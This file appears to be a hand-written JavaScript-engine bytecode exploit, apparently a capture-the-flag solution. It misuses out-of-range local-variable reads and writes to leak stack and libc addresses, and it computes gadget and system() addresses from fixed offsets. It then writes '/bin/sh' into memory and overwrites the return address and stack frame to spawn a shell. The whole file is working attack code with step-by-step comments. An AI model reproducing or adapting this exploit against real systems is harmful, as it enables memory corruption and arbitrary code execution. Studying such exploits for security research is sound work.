:stack_size 1

@flt_bin_sh_str  f.0068732F6E69622F

@float_add_raw *
@stack_leak_prep <stack_leak_prep.s>

# Mark stack address as float
fclosure8 stack_leak_prep
call0
drop

## Compute offset var_buf address
fclosure8 float_add_raw
# Get prepared float
get_loc 25
push_i32 -384
call2
# Store at safe location
put_loc 39

# Copy var_buf to safe location using get_loc and put_loc
get_loc 17
put_loc 37

# Offset var_buf by 8
get_loc 39
put_loc 17

## Read var_buf value to get stack reference
# First mark it as a float by writing 7 right after it
push_7
put_loc 37

# Reset var_buf 
get_loc 36
# OG var_buf value is now in loc36 tag
put_loc 16

# Read float
get_loc 37

# Create a duplicate for later
dup

## Get heap address (__libc_start_call_main)
# First mark it as float
push_7
put_loc 226

# Offset var_buf by 8
get_loc 39
put_loc 17

fclosure8 float_add_raw

# Read float
get_loc 225
swap
get_loc 225

# The JS Stack is now: stack address (x2), heap address, float_add_raw, heap address

# Compute gadget address
push_i32 1705
call2

# Overwrite return address with gadget
put_loc 33

swap

# JS Stack is now: stack address, heap address, stack address

# Reset var_buf
get_loc 36
put_loc 16

# Write "/bin/sh" to memory
push_const8 flt_bin_sh_str
put_loc 47

# Write address to stack by computing it from our known stack address
fclosure8 float_add_raw
swap
push_i32 752
call2
put_loc 34

## Write system address (compute from known heap address)
fclosure8 float_add_raw
swap
push_i32 189814
call2
put_loc 35

# Offset var_buf by 8
get_loc 39
put_loc 17

# Overwrite sf. This will clobber var_buf, so no more put_loc/get_loc after this!
fclosure8 float_add_raw
swap
push_i32 2592
call2
put_loc 16

undefined
return